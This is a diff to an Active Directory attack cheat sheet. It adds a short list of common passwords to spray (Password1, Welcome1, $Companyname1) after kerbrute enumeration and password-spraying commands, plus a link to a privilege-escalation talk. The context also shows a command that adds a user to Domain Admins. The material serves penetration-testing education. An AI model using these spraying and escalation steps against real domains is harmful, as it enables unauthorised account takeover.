@@ -570,6 +570,12 @@ root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
 ```
 
+Most of the time the best passwords to spray are :
+
+- Password1
+- Welcome1
+- $Companyname1
+
 
 ## Privilege Escalation
 
@@ -658,3 +664,4 @@ net group "Domain Admins" hacker2 /add /domain
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
+* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
